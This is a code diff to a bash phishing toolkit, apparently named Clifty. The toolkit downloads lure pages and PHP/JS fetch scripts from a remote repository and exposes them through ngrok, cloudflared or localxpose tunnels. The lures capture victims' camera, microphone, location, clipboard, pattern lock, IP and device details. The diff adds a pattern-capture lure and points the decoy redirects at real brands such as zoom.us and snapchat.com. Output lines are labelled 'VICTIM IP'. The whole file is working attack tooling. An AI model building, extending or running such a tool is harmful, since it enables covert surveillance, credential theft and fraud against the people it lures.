@@ -136,7 +136,8 @@ date_second=$(date +%S)
 date_nanosec=$(date +%n)
 
 #Links
-link_modules_raw=https://raw.githubusercontent.com/Alygnt/phisher-modules
+link_clifty="https://github.com/Alygnt/Clifty"
+link_modules_raw="https://raw.githubusercontent.com/Alygnt/phisher-modules"
 
 #Prompt---
 prompt="$(echo -e "${GREEN}>> ${ULYELLOW}Clifty${NF} >>${NA} ${CYAN}")"
@@ -224,29 +225,34 @@ directories(){
                 rm -rf ".cld.log"
         fi
         if [  ! -e "${fetch_dir}/ip.php" ]; then
-                wget --no-check-certificate ${link_modules_raw}/sites/fetch/ip.php
+                wget --no-check-certificate ${link_modules_raw}/sites/fetch/ip.php > /dev/null 2>&1
                 mv ip.php ${fetch_dir}
                 echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloaded ip.php"
         fi
         if [ ! -e "${fetch_dir}/index.php" ]; then
-                wget --no-check-certificate ${link_modules_raw}/sites/fetch/index.php
+                wget --no-check-certificate ${link_modules_raw}/sites/fetch/index.php > /dev/null 2>&1
                 mv index.php ${fetch_dir}
                 echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloaded index.php"
         fi
         if [  ! -e "${fetch_dir}/device.php" ]; then
-                wget --no-check-certificate ${link_modules_raw}/sites/fetch/device.php
+                wget --no-check-certificate ${link_modules_raw}/sites/fetch/device.php > /dev/null 2>&1
                 mv device.php ${fetch_dir}
                 echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloaded device.php"
         fi
         if [ ! -e "${fetch_dir}/device_post.php" ]; then
-                wget --no-check-certificate ${link_modules_raw}/sites/fetch/device_post.php
+                wget --no-check-certificate ${link_modules_raw}/sites/fetch/device_post.php > /dev/null 2>&1
                 mv device_post.php ${fetch_dir}
                 echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloaded device_post.php"
         fi
         if [ ! -e "${fetch_dir}/device.js" ]; then
-                wget --no-check-certificate ${link_modules_raw}/sites/fetch/device.js
+                wget --no-check-certificate ${link_modules_raw}/sites/fetch/device.js > /dev/null 2>&1
                 mv device.js ${fetch_dir}
                 echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloaded device.js"
+        fi
+        if [ ! -e "${fetch_dir}/device.html" ]; then
+                wget --no-check-certificate ${link_modules_raw}/sites/fetch/device.html > /dev/null 2>&1
+                mv device.html ${fetch_dir}
+                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloaded device.html"
         fi
         if [ !  -x "${dgf_dir}/dgf.sh" ];then
                 chmod 777 "${dgf_dir}/dgf.sh"
@@ -411,7 +417,8 @@ echo -e "${CYAN} [2]${GREEN} Camera         ${NC}""${CYAN} [B]${MAGENTA} Request
 echo -e "${CYAN} [3]${GREEN} Microphone     ${NC}""${CYAN} [C]${MAGENTA} Report Issue      ${NC}"
 echo -e "${CYAN} [4]${GREEN} Location       ${NC}""${CYAN} [D]${MAGENTA} Download All sites${NC}"
 echo -e "${CYAN} [5]${GREEN} Clipboard      ${NC}""${CYAN} [E]${MAGENTA} Logs              ${NC}"
-echo -e "${CYAN} [6]${GREEN} IP address     ${NC}""${CYAN} [F]${MAGENTA} Update            ${NC}"
+echo -e "${CYAN} [6]${GREEN} Pattern        ${NC}""${CYAN} [F]${MAGENTA} Update            ${NC}"
+echo -e "${CYAN} [7]${GREEN} IP address     ${NC}""${CYAN} [G]${MAGENTA} Open Discussions  ${NC}"
 echo -e " "
 echo -e "${CYAN}              [X/0]${RED} EXIT ${NC}"
 echo -e " "
@@ -433,16 +440,19 @@ case $reply_home in
                 site_access="clipboard"
 		menu_clipboard;;
         6 )
+                site_access="pattern"
+		menu_pattern;;
+        7 )
                 site_access="ip_address"
 		menu_ip;;
 	A | a)
-		xdg-open https://github.com/Alygnt/Clifty
+		xdg-open ${link_clifty}
 		{ sleep 2; clear;  banner; homepage; };;
 	B | b )
-                xdg-open https://github.com/Alygnt/Clifty/discussions/new?category=new-site
+                xdg-open ${link_clifty}/discussions/new?category=new-site
 		{ sleep 2; clear; banner; homepage; };;
         C | c)
-                xdg-open https://github.com/RDXLR/Alygnt/issues/new
+                xdg-open ${link_clifty}/issues/new
 		{ sleep 2; clear; banner; homepage; };;
         D | d)
                 download_allsite;;
@@ -451,7 +461,7 @@ case $reply_home in
 	F | f)
 		update;;
         G | g)
-                xdg-open https://github.com/Alygnt/Clifty/discussions
+                xdg-open ${link_clifty}/discussions
 		{ sleep 2; clear; banner; homepage; };;
 	0 | 00 | x | X | exit)
 		msg_exit;;
@@ -687,42 +697,42 @@ case $reply_camera in
         4 )
                 site_id="boxwish"
                 dgfname="boxwish"
-                rdurl="www.play.google.com/store/apps/details?id=com.google.android.GoogleCamera"
+                rdurl="www.google.com"
                 site_name="Image"
                 capture_type="IMG"
                 site_template="Box Wish" ;;
         5 )
                 site_id="firework"
                 dgfname="firework"
-                rdurl="www.play.google.com/store/apps/details?id=com.google.android.GoogleCamera"
+                rdurl="www.fireworks.com"
                 site_name="Image"
                 capture_type="IMG"
                 site_template="Firework" ;;
         6 )
                 site_id="game"
                 dgfname="game"
-                rdurl="www.play.google.com/store/apps/details?id=com.google.android.GoogleCamera"
+                rdurl="www.chess.com"
                 site_name="Image"
                 capture_type="IMG"
                 site_template="Game" ;;
         7 )
                 site_id="guess"
                 dgfname="guess"
-                rdurl="www.play.google.com/store/apps/details?id=com.google.android.GoogleCamera"
+                rdurl="www.guess.com"
                 site_name="Image"
                 capture_type="IMG"
                 site_template="Guess" ;;
 	8 )
                 site_id="quiz"
                 dgfname="quiz"
-                rdurl="www.play.google.com/store/apps/details?id=com.google.android.GoogleCamera"
+                rdurl="www.quiz.com"
                 site_name="Image"
                 capture_type="IMG"
                 site_template="Quiz" ;;
         9 )
                 site_id="rps"
                 dgfname="rps"
-                rdurl="www.play.google.com/store/apps/details?id=com.google.android.GoogleCamera"
+                rdurl="www.google.com"
                 site_name="Image"
                 capture_type="IMG"
                 site_template="RPS" ;;
@@ -736,23 +746,23 @@ case $reply_camera in
         11 )
                 site_id="spinwheel"
                 dgfname="spinwheel"
-                rdurl="www.play.google.com/store/apps/details?id=com.google.android.GoogleCamera"
+                rdurl="www.luckydraw.live"
                 site_name="Image"
                 capture_type="IMG"
                 site_template="Spin Wheel" ;;
         A | a )
                 site_id="filter"
                 dgfname="filter"
-                rdurl="www.play.google.com/store/apps/details?id=com.google.android.GoogleCamera"
+                rdurl="www.snapchat.com"
                 site_name="Video"
-                capture_type="VIDEO"
+                capture_type="VID"
                 site_template="Filter" ;;
         B | b )
                 site_id="onlinemeet"
                 dgfname="onlinemeet"
-                rdurl="www.play.google.com/store/apps/details?id=com.google.android.GoogleCamera"
+                rdurl="www.zoom.us"
                 site_name="Video"
-                capture_type="VIDEO"
+                capture_type="VID"
                 site_template="Online Meet" ;;
 	0 | 00 | x | X | exit)
 		msg_exit;;
@@ -864,6 +874,32 @@ case $reply_clipboard in
                  { sleep 1; clear; menu_clipboard; };;
 esac    
 }
+menu_pattern(){
+status_display
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A PAGE${NF} : ${NC} "
+echo -e ""
+echo -e "${CYAN} [1]${MAGENTA} Default        ${NC}"
+echo -e "${CYAN} More sites are coming soon   ${NC}"
+echo -e " "
+echo -e "${CYAN} [X/0]${RED} EXIT ${NC}"
+echo -e " "
+read -p "${prompt}" reply_pattern
+case $reply_pattern in
+        1 )
+                site_id="default"
+                dgfname="default"
+                rdurl="www.google.com"
+                site_name="Pattern"
+                capture_type="PAT"
+                site_template="Default" ;;
+	0 | 00 | x | X | exit)
+		msg_exit;;
+        
+	*)
+		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                 { sleep 1; clear; menu_pattern; };;
+esac    
+}
 menu_ip(){
 status_display
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A PAGE${NF} : ${NC} "
@@ -878,7 +914,7 @@ case $reply_ip in
         1 )
                 site_id="default"
                 dgfname="default"
-                rdurl="www.play.google.com/store/apps/details?id=com.google.android.GoogleCamera"
+                rdurl="www.google.com"
                 site_name="IP Details"
                 capture_type="IP"
                 site_template="Default" ;;
@@ -947,7 +983,7 @@ read -p "${temprompt}" reply_logs_menu
                 2 | 02)
 			ls ${logs_dir}/
                         echo -e ""
-                        temprompt="$(echo -e "${RED}[${WHITE}?${RED}]${YELLOW} Enter the file name without extension (.txt) >> ${BLUE}")"
+                        temprompt="$(echo -e "${RED}[${WHITE}?${RED}]${BOLDWHITE} Enter the file name without extension (.txt) ${YELLOW}>> ${BLUE}")"
                         read -p "${temprompt}"
 			if [ -f "${logs_dir}/$REPLY.txt" ]; then
 				cat ${logs_dir}/$REPLY.txt
@@ -1060,7 +1096,7 @@ ngrok_token_setup(){
 	read -p "${temprompt}" ntoken
 	echo -e "authtoken : ${ntoken}" >> ngrok.yml
 	mv ngrok.yml ${HOME}/.ngrok2/
-	./.server/ngrok config upgrade
+	.${server_dir}/ngrok config upgrade
 	echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Upgraded ngrok configurations"
 	clear
 	banner
@@ -1096,7 +1132,12 @@ start_ngrok() {
         setup_site_check
 	echo -e "\n"
 	ngrokregion="us"
-        temprompt="$(echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE}CHANGE NGROK SERVER REGION (Y/n) ${NA}${YELLOW}>> ${NA}")"
+        echo -e "${RED}[${WHITE}?${RED}]${ULWHITE}${BOLDWHITE}Change ngrok server region ${NA}"
+        echo -e "   ${GREEN}Current region : ${BLUE}${ngrokregion}${NA}"
+        echo -e ""
+        echo -e "${BLUE}[1/Y]  ${CYAN} YES ${NC}"
+        echo -e "${BLUE}[2/N/*]${CYAN} NO ${NC}"
+        echo -e ""
 	read -p "${temprompt}"
 	case $REPLY in
 	1 | Y | y | yes | Yes | YES)
@@ -1107,9 +1148,9 @@ start_ngrok() {
 #load_print "Launching NGROK" '15'
         echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
         if [[ `command -v termux-chroot` ]]; then
-                sleep 2 && termux-chroot ./.server/ngrok http --region ${ngrokregion} "$HOST":"$PORT"> /dev/null 2>&1 &
+                sleep 2 && termux-chroot .${server_dir}/ngrok http --region ${ngrokregion} "$HOST":"$PORT"> /dev/null 2>&1 &
         else
-                sleep 2 && ./.server/ngrok http --region ${ngrokregion} "$HOST":"$PORT"> /dev/null 2>&1 &
+                sleep 2 && .${server_dir}/ngrok http --region ${ngrokregion} "$HOST":"$PORT"> /dev/null 2>&1 &
         fi
 	sleep 15
 	fetchlink_ngrok
@@ -1164,9 +1205,9 @@ start_cloudflared() {
         echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
 
         if [[ `command -v termux-chroot` ]]; then
-                sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
+                sleep 2 && termux-chroot .${server_dir}/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
         else
-                sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
+                sleep 2 && .${server_dir}/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
         fi
 	sleep 15
 	fetchlink_cloudflared
@@ -1217,11 +1258,11 @@ install_localxpose() {
 		fi
 }
 token_localxpose() {
-	./.server/loclx -help > /dev/null 2>&1 &
+	.${server_dir}/loclx -help > /dev/null 2>&1 &
 	sleep 1
 	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access"
 
-	[ "$(./.server/loclx account status | grep Error)" ] && {
+	[ "$(.${server_dir}/loclx account status | grep Error)" ] && {
 		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${YELLOW}localxpose.io${GREEN} & copy the token\n"
 		sleep 3
                 temprompt="$(echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE} ENTER YOUR AUTHTOKEN${NA}${YELLOW} >> ${NA}")"
@@ -1244,7 +1285,7 @@ start_loclx() {
 	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
 
 	if [[ `command -v termux-chroot` ]]; then
-		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > ${server_dir}/.loclx 2>&1 &
+		sleep 1 && termux-chroot .${server_dir}/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > ${server_dir}/.loclx 2>&1 &
 	else
 		sleep 1 && ./${server_dir}/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > ${server_dir}/.loclx 2>&1 &
 	fi
@@ -1300,7 +1341,7 @@ HOST='127.0.0.1'
 cusport() {
         status_display
         PORT=4444
-        echo -e "${RED}[${WHITE}?${RED}]${ULWHITE}${BOLDWHITE}DO YOU WANT TO SETUP CUSTOM PORT ${NA}${YELLOW} >> ${BLUE}"
+        echo -e "${RED}[${WHITE}?${RED}]${ULWHITE}${BOLDWHITE}DO YOU WANT TO SETUP CUSTOM PORT ${NA}"
         echo -e "   ${GREEN}Current port : ${BLUE}${PORT}${NA}"   
         echo -e ""
         echo -e "${BLUE}[1/Y]  ${CYAN} YES ${NC}"
@@ -1325,10 +1366,6 @@ cusport() {
 setup_site_check() {
         status_display
         final_site_dir="${sites_dir}/${site_access}${site_id}"
-        cp ${fetch_dir}/ip.php ${www_dir}
-	cp ${fetch_dir}/index.php ${www_dir}
-        cp ${fetch_dir}/device.php ${www_dir}
-        cp ${fetch_dir}/device_post.js ${www_dir}
         if [ -d ${final_site_dir} ]; then
                 if [ -d "${final_site_dir}" ]; then
                         echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Site is already downloaded... NOW STARTING!! " 
@@ -1341,6 +1378,24 @@ setup_site_check() {
                 echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Site is not downloaded!! "
                 setup_site_dgf
         fi
+        if [ ! -e "${www_dir}/index.php" ]; then
+                cp ${fetch_dir}/index.php ${www_dir}
+        fi
+        if [ ! -e "${www_dir}/ip.php" ]; then
+                cp ${fetch_dir}/ip.php ${www_dir}
+        fi
+        if [ ! -e "${www_dir}/device.php" ]; then
+                cp ${fetch_dir}/device.php ${www_dir}
+        fi
+        if [ ! -e "${www_dir}/device_post.php" ]; then
+                cp ${fetch_dir}/device_post.php ${www_dir}
+        fi
+        if [ ! -e "${www_dir}/device.html" ]; then
+                cp ${fetch_dir}/device.html ${www_dir}
+        fi
+        cusport
+        redirect_check
+        start_php
 }
 ## Setup website - offline
 setup_site_downloaded() {
@@ -1348,36 +1403,34 @@ setup_site_downloaded() {
         sleep 1
         echo -e "\n${RED}[${WHITE}-${RED}]${ULBLUE} SETTING UP SERVER....${NA}"
         cp -rf ${final_site_dir}/* ${www_dir}
-        cusport
-        redirect_check
-        start_php
 }
 setup_site_dgf() {
 	rm -rf ${site_access}
-        dgfurl="https://github.com/Alygnt/phisher-modules/tree/sites/$site_access/$dgfname"
+        dgfurl="https://github.com/Alygnt/phisher-modules/tree/sites/$site_access/$site_id"
         status
 	if [ $plainnetstats == "online" ]; then
                 echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Downloading site..."${WHITE}
-                bash ${dgf_dir}/dgf.sh ${dgfurl}
-                if [ -d ${site_access}/${dgfname} ]; then
+                if [ ${capture_type}="NOTP" ];then
+                        bash ${dgf_dir}/dgf.sh ${dgfurl} otp
+                else
+                        bash ${dgf_dir}/dgf.sh ${dgfurl} none
+                fi
+                if [ -d ${site_access}/${site_id} ]; then
                         echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Site downloaded Successfully..." 
                         echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} SETTING UP" 
                         cp -rf ${site_access}/${site_id}/* ${www_dir}
-                        rm -rf ${site_access}
-                        cusport
-                        redirect_check
-                        start_php
+                        rm -rf ${site_access} 
                 else 
                         echo -e "\n${RED}[${WHITE}-${RED}]${RED} Unable to download the site!! "
                         echo -e "\n${RED}[${WHITE}-${RED}]${RED} Try again later!!"
                         sleep 5
-                        homepage
+                        msg_exit
                 fi
 	else
 		echo -e "\n${BLUE}[${RED}!${BLUE}]${BOLDRED} Your offline can't download the site!!${NA}"
 		echo -e "\n${RED}[${WHITE}-${RED}]${RED} Try again later!!"
                 sleep 5
-                homepage
+                msg_exit
 	fi
 }
 start_php() {
@@ -1401,7 +1454,7 @@ redirect_check(){
                 1 | Y | y | yes | Yes | YES)
   	                redirect_input;;
                 *)
-                        redirect_default;;
+                        redirect_setup;;
 	        esac
 }
 redirect_input() {
@@ -1419,42 +1472,21 @@ redirect_input() {
 	fi
 }
 redirect_setup() {
-        rm -rf rdurl.php
-        rm -rf "${www_dir}/rdurl.php"
+        if [ -z "$urdurl" ]; then
+               rdurl=${urdurl}
+        fi 
 	if [ ${capture_type}="NOTP" ];then
-                awk "{gsub(\"redirecturl\",\"https://${urdurl}\"); print}" "${www_dir}/process.php" > rdurl.php
-                rm -rf "${www_dir}/process.php"
-                mv rdurl.php "${www_dir}/process.php"
-                rdurl=${urdurl}
+                awk -i inplace "{gsub(\"redirecturl\",\"https://${urdurl}\"); print}" "${www_dir}/process.php"
         elif [[ ${capture_type}="OOTP" || ${capture_type}="POTP" ]];then
-                awk  "{gsub(\"redirecturl\",\"https://${urdurl}\"); print}" "${www_dir}/otp.php" > rdurl.php
-                rm -rf "${www_dir}/otp.php"
-                mv rdurl.php "${www_dir}/otp.php"
-                rdurl=${urdurl}
+                awk -i inplace "{gsub(\"redirecturl\",\"https://${urdurl}\"); print}" "${www_dir}/otp.php"
 	else
 		echo -e "${RED}[${WHITE}!${RED}]${RED} Error Occured in setting up custom redirect URL!!"
                 echo -ne "\n${RED}[${WHITE}?${RED}]${GREEN} Setting up default redirect URL"
                 echo -ne "${RED}[${WHITE}?${RED}]${GREEN} Redirect URL : ${BLUE} ${rdurl}"
                 sleep 3
-                redirect_default
+                urdurl=${rdurl}
+                redirect_setup
         fi
-}
-redirect_default() {
-        rm -rf rdurl.php
-        rm -rf "${www_dir}/rdurl.php"
-	if [ ${capture_type}="NOTP" ];then
-                awk "{gsub(\"redirecturl\",\"https://${rdurl}\"); print}" "${www_dir}/process.php" > rdurl.php
-                rm -rf "${www_dir}/process.php"
-                mv rdurl.php "${www_dir}/process.php"
-        elif [[ ${capture_type}="OOTP" || ${capture_type}="POTP" ]];then
-                awk  "{gsub(\"redirecturl\",\"https://${rdurl}\"); print}" "${www_dir}/otp.php" > rdurl.php
-                rm -rf "${www_dir}/otp.php"
-                mv rdurl.php "${www_dir}/otp.php"
-	else
-		echo -e " ${RED}[${WHITE}!${RED}]${RED} Error Occured in setting up redirect URL!!"
-                sleep 5
-        fi
-
 }
 
 #Check whether link was generated properly
@@ -1700,19 +1732,18 @@ capture_ip() {
 ##	IP=$(awk -F 'IP: ' '{print $2}' ${www_dir}/ip.txt | xargs)
 	victim_ip=${IP}
 	echo -e "\n\n${RED}[${WHITE}-${RED}]${MAGENTABG} ${ULWHITE} VICTIM IP : ${BOLDWHITE}${victim_ip}${NA}"
-	if [[ $reply_tunnel -eq 1 || $reply_tunnel -eq 01 ]]; then
-		echo -ne "${RED} IP details cannot be captured in localhost server"
-	else
-		ip_details $IP
-	fi
         cat ${dumps_dir}/space.txt >> ${final_logs_name}
 	cat ${dumps_dir}/line.txt >> ${final_logs_name}
 	cat ${www_dir}/ip.txt >> ${final_logs_name}
 	cat ${dumps_dir}/space.txt >> ${final_logs_name}
         cat ${dumps_dir}/line.txt >> ${final_logs_name}
 	cat ${dumps_dir}/space.txt >> ${final_logs_name}
-	echo -ne " "
 	echo -ne "\n${BLUE}Saved IP address in Logs"
+	if [[ $reply_tunnel -eq 1 || $reply_tunnel -eq 01 ]]; then
+		echo -ne "${RED} IP details cannot be captured in localhost server"
+	else
+		ip_details $IP
+	fi
 	rm -rf ${www_dir}/ip.txt
         if [ -f "${www_dir}/device.txt" ]; then
                 echo -e "\n\n${RED}[${WHITE}-${RED}]${MAGENTABG} ${ULWHITE} VICTIM DEVICE DETAILS : ${RESETBG} ${BOLDWHITE}"
